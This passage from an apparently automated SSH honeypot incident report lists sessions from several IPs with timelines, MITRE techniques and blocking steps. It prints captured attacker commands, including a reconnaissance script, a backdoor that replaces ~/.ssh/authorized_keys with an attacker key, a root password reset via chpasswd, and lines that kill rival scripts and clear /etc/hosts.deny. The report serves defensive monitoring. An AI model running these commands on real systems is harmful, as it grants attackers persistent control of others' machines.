| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-14 08:51:09` | `cowrie.session.connect` |
| `2026-03-14 08:51:09` | `cowrie.client.version` |
| `2026-03-14 08:51:09` | `cowrie.client.kex` |
| `2026-03-14 08:51:09` | `cowrie.login.success` |
| `2026-03-14 08:51:09` | `cowrie.session.params` |
| `2026-03-14 08:51:09` | `cowrie.command.input` |
| `2026-03-14 08:51:09` | `cowrie.command.input` |
| `2026-03-14 08:51:09` | `cowrie.command.input` |
| `2026-03-14 08:51:09` | `cowrie.command.input` |
| `2026-03-14 08:51:09` | `cowrie.log.closed` |
| `2026-03-14 08:51:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `68.183.86[.]77` to AbuseIPDB if not already reported
- [ ] Block `68.183.86[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d25e92fb27b

| Field | Detail |
|---|---|
| **Source IP** | `68.183.86[.]77` |
| **First Seen** | 2026-03-14 08:51 |
| **Last Seen** | 2026-03-14 08:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-14 08:51:49` | `cowrie.session.connect` |
| `2026-03-14 08:51:49` | `cowrie.client.version` |
| `2026-03-14 08:51:49` | `cowrie.client.kex` |
| `2026-03-14 08:51:49` | `cowrie.login.success` |
| `2026-03-14 08:51:49` | `cowrie.session.params` |
| `2026-03-14 08:51:49` | `cowrie.command.input` |
| `2026-03-14 08:51:49` | `cowrie.command.input` |
| `2026-03-14 08:51:49` | `cowrie.command.input` |
| `2026-03-14 08:51:49` | `cowrie.command.input` |
| `2026-03-14 08:51:49` | `cowrie.log.closed` |
| `2026-03-14 08:51:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `68.183.86[.]77` to AbuseIPDB if not already reported
- [ ] Block `68.183.86[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c69265684d32

| Field | Detail |
|---|---|
| **Source IP** | `197.243.0[.]62` |
| **First Seen** | 2026-03-14 09:14 |
| **Last Seen** | 2026-03-14 09:14 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-14 09:14:08` | `cowrie.session.connect` |
| `2026-03-14 09:14:08` | `cowrie.client.version` |
| `2026-03-14 09:14:08` | `cowrie.client.kex` |
| `2026-03-14 09:14:09` | `cowrie.login.success` |
| `2026-03-14 09:14:10` | `cowrie.session.params` |
| `2026-03-14 09:14:10` | `cowrie.command.input` |
| `2026-03-14 09:14:10` | `cowrie.command.failed` |
| `2026-03-14 09:14:10` | `cowrie.log.closed` |
| `2026-03-14 09:14:10` | `cowrie.session.params` |
| `2026-03-14 09:14:10` | `cowrie.command.input` |
| `2026-03-14 09:14:11` | `cowrie.session.file_download` |
| `2026-03-14 09:14:11` | `cowrie.log.closed` |
| `2026-03-14 09:14:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.243.0[.]62` to AbuseIPDB if not already reported
- [ ] Block `197.243.0[.]62` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8354a47aabfe

| Field | Detail |
|---|---|
| **Source IP** | `197.243.0[.]62` |
| **First Seen** | 2026-03-14 09:14 |
| **Last Seen** | 2026-03-14 09:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-14 09:14:13` | `cowrie.session.connect` |
| `2026-03-14 09:14:13` | `cowrie.client.version` |
| `2026-03-14 09:14:14` | `cowrie.client.kex` |
| `2026-03-14 09:14:15` | `cowrie.login.success` |
| `2026-03-14 09:14:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.243.0[.]62` to AbuseIPDB if not already reported
- [ ] Block `197.243.0[.]62` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f386172b300

| Field | Detail |
|---|---|
| **Source IP** | `197.243.0[.]62` |
| **First Seen** | 2026-03-14 09:16 |
| **Last Seen** | 2026-03-14 09:16 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-14 09:16:50` | `cowrie.session.connect` |
| `2026-03-14 09:16:50` | `cowrie.client.version` |
| `2026-03-14 09:16:50` | `cowrie.client.kex` |
| `2026-03-14 09:16:51` | `cowrie.login.success` |
| `2026-03-14 09:16:51` | `cowrie.session.params` |
| `2026-03-14 09:16:51` | `cowrie.command.input` |
| `2026-03-14 09:16:51` | `cowrie.command.failed` |
| `2026-03-14 09:16:52` | `cowrie.log.closed` |
| `2026-03-14 09:16:52` | `cowrie.session.params` |
| `2026-03-14 09:16:52` | `cowrie.command.input` |
| `2026-03-14 09:16:52` | `cowrie.session.file_download` |
| `2026-03-14 09:16:52` | `cowrie.log.closed` |
| `2026-03-14 09:16:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.243.0[.]62` to AbuseIPDB if not already reported
- [ ] Block `197.243.0[.]62` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f4ec9ea7c27c

| Field | Detail |
|---|---|
| **Source IP** | `197.243.0[.]62` |
| **First Seen** | 2026-03-14 09:16 |
| **Last Seen** | 2026-03-14 09:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-14 09:16:55` | `cowrie.session.connect` |
| `2026-03-14 09:16:55` | `cowrie.client.version` |
| `2026-03-14 09:16:55` | `cowrie.client.kex` |
| `2026-03-14 09:16:56` | `cowrie.login.success` |
| `2026-03-14 09:16:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.243.0[.]62` to AbuseIPDB if not already reported
- [ ] Block `197.243.0[.]62` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-93c10091cfdd

| Field | Detail |
|---|---|
| **Source IP** | `197.243.0[.]62` |
| **First Seen** | 2026-03-14 09:27 |
| **Last Seen** | 2026-03-14 09:27 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-14 09:27:00` | `cowrie.session.connect` |
| `2026-03-14 09:27:00` | `cowrie.client.version` |
| `2026-03-14 09:27:01` | `cowrie.client.kex` |
| `2026-03-14 09:27:02` | `cowrie.login.success` |
| `2026-03-14 09:27:02` | `cowrie.session.params` |
| `2026-03-14 09:27:02` | `cowrie.command.input` |
| `2026-03-14 09:27:02` | `cowrie.command.failed` |
| `2026-03-14 09:27:02` | `cowrie.log.closed` |
| `2026-03-14 09:27:03` | `cowrie.session.params` |
| `2026-03-14 09:27:03` | `cowrie.command.input` |
| `2026-03-14 09:27:03` | `cowrie.session.file_download` |
| `2026-03-14 09:27:03` | `cowrie.log.closed` |
| `2026-03-14 09:27:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.243.0[.]62` to AbuseIPDB if not already reported
- [ ] Block `197.243.0[.]62` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f16594d493b

| Field | Detail |
|---|---|
| **Source IP** | `197.243.0[.]62` |
| **First Seen** | 2026-03-14 09:27 |
| **Last Seen** | 2026-03-14 09:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-14 09:27:06` | `cowrie.session.connect` |
| `2026-03-14 09:27:06` | `cowrie.client.version` |
| `2026-03-14 09:27:06` | `cowrie.client.kex` |
| `2026-03-14 09:27:07` | `cowrie.login.success` |
| `2026-03-14 09:27:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.243.0[.]62` to AbuseIPDB if not already reported
- [ ] Block `197.243.0[.]62` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e5e0b298eef

| Field | Detail |
|---|---|
| **Source IP** | `197.243.0[.]62` |
| **First Seen** | 2026-03-14 09:29 |
| **Last Seen** | 2026-03-14 09:29 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-14 09:29:33` | `cowrie.session.connect` |
| `2026-03-14 09:29:33` | `cowrie.client.version` |
| `2026-03-14 09:29:33` | `cowrie.client.kex` |
| `2026-03-14 09:29:34` | `cowrie.login.success` |
| `2026-03-14 09:29:35` | `cowrie.session.params` |
| `2026-03-14 09:29:35` | `cowrie.command.input` |
| `2026-03-14 09:29:35` | `cowrie.command.failed` |
| `2026-03-14 09:29:35` | `cowrie.log.closed` |
| `2026-03-14 09:29:35` | `cowrie.session.params` |
| `2026-03-14 09:29:35` | `cowrie.command.input` |
| `2026-03-14 09:29:36` | `cowrie.session.file_download` |
| `2026-03-14 09:29:36` | `cowrie.log.closed` |
| `2026-03-14 09:29:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.243.0[.]62` to AbuseIPDB if not already reported
- [ ] Block `197.243.0[.]62` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed3b69b61b0c

| Field | Detail |
|---|---|
| **Source IP** | `197.243.0[.]62` |
| **First Seen** | 2026-03-14 09:29 |
| **Last Seen** | 2026-03-14 09:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-14 09:29:39` | `cowrie.session.connect` |
| `2026-03-14 09:29:39` | `cowrie.client.version` |
| `2026-03-14 09:29:39` | `cowrie.client.kex` |
| `2026-03-14 09:29:40` | `cowrie.login.success` |
| `2026-03-14 09:29:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.243.0[.]62` to AbuseIPDB if not already reported
- [ ] Block `197.243.0[.]62` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b628e7efd614

| Field | Detail |
|---|---|
| **Source IP** | `197.243.0[.]62` |
| **First Seen** | 2026-03-14 09:32 |
| **Last Seen** | 2026-03-14 09:32 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-14 09:32:13` | `cowrie.session.connect` |
| `2026-03-14 09:32:13` | `cowrie.client.version` |
| `2026-03-14 09:32:13` | `cowrie.client.kex` |
| `2026-03-14 09:32:14` | `cowrie.login.success` |
| `2026-03-14 09:32:15` | `cowrie.session.params` |
| `2026-03-14 09:32:15` | `cowrie.command.input` |
| `2026-03-14 09:32:15` | `cowrie.command.failed` |
| `2026-03-14 09:32:15` | `cowrie.log.closed` |
| `2026-03-14 09:32:16` | `cowrie.session.params` |
| `2026-03-14 09:32:16` | `cowrie.command.input` |
| `2026-03-14 09:32:16` | `cowrie.session.file_download` |
| `2026-03-14 09:32:16` | `cowrie.log.closed` |
| `2026-03-14 09:32:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.243.0[.]62` to AbuseIPDB if not already reported
- [ ] Block `197.243.0[.]62` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dba5e2bb62eb

| Field | Detail |
|---|---|
| **Source IP** | `197.243.0[.]62` |
| **First Seen** | 2026-03-14 09:32 |
| **Last Seen** | 2026-03-14 09:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-14 09:32:19` | `cowrie.session.connect` |
| `2026-03-14 09:32:19` | `cowrie.client.version` |
| `2026-03-14 09:32:19` | `cowrie.client.kex` |
| `2026-03-14 09:32:20` | `cowrie.login.success` |
| `2026-03-14 09:32:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.243.0[.]62` to AbuseIPDB if not already reported
- [ ] Block `197.243.0[.]62` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a8ca0ce0539

| Field | Detail |
|---|---|
| **Source IP** | `190.90.79[.]26` |
| **First Seen** | 2026-03-14 09:39 |
| **Last Seen** | 2026-03-14 09:39 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-14 09:39:07` | `cowrie.session.connect` |
| `2026-03-14 09:39:07` | `cowrie.client.version` |
| `2026-03-14 09:39:07` | `cowrie.client.kex` |
| `2026-03-14 09:39:09` | `cowrie.login.success` |
| `2026-03-14 09:39:10` | `cowrie.direct-tcpip.request` |
| `2026-03-14 09:39:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.90.79[.]26` to AbuseIPDB if not already reported
- [ ] Block `190.90.79[.]26` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d4dbb4f8ccd

| Field | Detail |
|---|---|
| **Source IP** | `118.193.37[.]79` |
| **First Seen** | 2026-03-14 11:05 |
| **Last Seen** | 2026-03-14 11:05 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:UoMW5NabQekq"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-14 11:05:19` | `cowrie.session.connect` |
| `2026-03-14 11:05:19` | `cowrie.client.version` |
| `2026-03-14 11:05:19` | `cowrie.client.kex` |
| `2026-03-14 11:05:20` | `cowrie.login.success` |
| `2026-03-14 11:05:20` | `cowrie.session.params` |
| `2026-03-14 11:05:20` | `cowrie.command.input` |
| `2026-03-14 11:05:20` | `cowrie.command.failed` |
| `2026-03-14 11:05:20` | `cowrie.log.closed` |
| `2026-03-14 11:05:21` | `cowrie.session.params` |
| `2026-03-14 11:05:21` | `cowrie.command.input` |
| `2026-03-14 11:05:21` | `cowrie.session.file_download` |
| `2026-03-14 11:05:21` | `cowrie.log.closed` |
| `2026-03-14 11:05:33` | `cowrie.session.params` |
| `2026-03-14 11:05:33` | `cowrie.command.input` |
| `2026-03-14 11:05:33` | `cowrie.log.closed` |
| `2026-03-14 11:05:33` | `cowrie.session.params` |
| `2026-03-14 11:05:33` | `cowrie.command.input` |
| `2026-03-14 11:05:34` | `cowrie.log.closed` |
| `2026-03-14 11:05:34` | `cowrie.session.params` |
| `2026-03-14 11:05:34` | `cowrie.command.input` |
| `2026-03-14 11:05:34` | `cowrie.session.file_download` |
| `2026-03-14 11:05:34` | `cowrie.log.closed` |
| `2026-03-14 11:05:34` | `cowrie.session.params` |
| `2026-03-14 11:05:34` | `cowrie.command.input` |
| `2026-03-14 11:05:35` | `cowrie.log.closed` |
| `2026-03-14 11:05:35` | `cowrie.session.params` |
| `2026-03-14 11:05:35` | `cowrie.command.input` |
| `2026-03-14 11:05:35` | `cowrie.log.closed` |
| `2026-03-14 11:05:35` | `cowrie.session.params` |
| `2026-03-14 11:05:35` | `cowrie.command.input` |
| `2026-03-14 11:05:35` | `cowrie.command.input` |
| `2026-03-14 11:05:36` | `cowrie.log.closed` |
| `2026-03-14 11:05:36` | `cowrie.session.params` |
| `2026-03-14 11:05:36` | `cowrie.command.input` |
| `2026-03-14 11:05:36` | `cowrie.log.closed` |
| `2026-03-14 11:05:36` | `cowrie.session.params` |
| `2026-03-14 11:05:36` | `cowrie.command.input` |
| `2026-03-14 11:05:37` | `cowrie.log.closed` |
| `2026-03-14 11:05:37` | `cowrie.session.params` |
| `2026-03-14 11:05:37` | `cowrie.command.input` |
| `2026-03-14 11:05:37` | `cowrie.log.closed` |
| `2026-03-14 11:05:38` | `cowrie.session.params` |
| `2026-03-14 11:05:38` | `cowrie.command.input` |
| `2026-03-14 11:05:38` | `cowrie.log.closed` |
| `2026-03-14 11:05:38` | `cowrie.session.params` |
| `2026-03-14 11:05:38` | `cowrie.command.input` |
| `2026-03-14 11:05:38` | `cowrie.log.closed` |
| `2026-03-14 11:05:39` | `cowrie.session.params` |
| `2026-03-14 11:05:39` | `cowrie.command.input` |
| `2026-03-14 11:05:39` | `cowrie.log.closed` |
| `2026-03-14 11:05:39` | `cowrie.session.params` |
| `2026-03-14 11:05:39` | `cowrie.command.input` |
| `2026-03-14 11:05:39` | `cowrie.log.closed` |
| `2026-03-14 11:05:40` | `cowrie.session.params` |
| `2026-03-14 11:05:40` | `cowrie.command.input` |
| `2026-03-14 11:05:40` | `cowrie.log.closed` |
| `2026-03-14 11:05:40` | `cowrie.session.params` |
| `2026-03-14 11:05:40` | `cowrie.command.input` |
| `2026-03-14 11:05:40` | `cowrie.log.closed` |
| `2026-03-14 11:05:40` | `cowrie.session.params` |
| `2026-03-14 11:05:40` | `cowrie.command.input` |
| `2026-03-14 11:05:41` | `cowrie.log.closed` |
| `2026-03-14 11:05:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.37[.]79` to AbuseIPDB if not already reported
- [ ] Block `118.193.37[.]79` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be9b98b0038c

| Field | Detail |
|---|---|
| **Source IP** | `192.241.161[.]237` |
| **First Seen** | 2026-03-14 12:14 |
| **Last Seen** | 2026-03-14 12:14 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-14 12:14:43` | `cowrie.session.connect` |
